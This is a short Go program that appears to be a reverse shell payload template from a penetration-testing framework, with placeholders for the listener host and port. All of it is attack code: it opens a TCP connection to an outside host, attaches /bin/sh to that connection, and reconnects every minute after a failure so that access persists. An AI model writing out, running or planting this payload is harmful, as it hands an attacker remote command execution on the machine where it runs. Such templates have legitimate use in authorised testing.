package main

import (
        "net"
        "os/exec"
        "time"
)

func main() {
        reverse("{{datastore.lhost}}:{{datastore.lport}}")
}

func reverse(host string) {
        c, err := net.Dial("tcp", host)
        if nil != err {
                if nil != c {
                        c.Close()
                }
                time.Sleep(time.Minute)
                reverse(host)
        }

        cmd := exec.Command("/bin/sh")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
        c.Close()
        reverse(host)
}
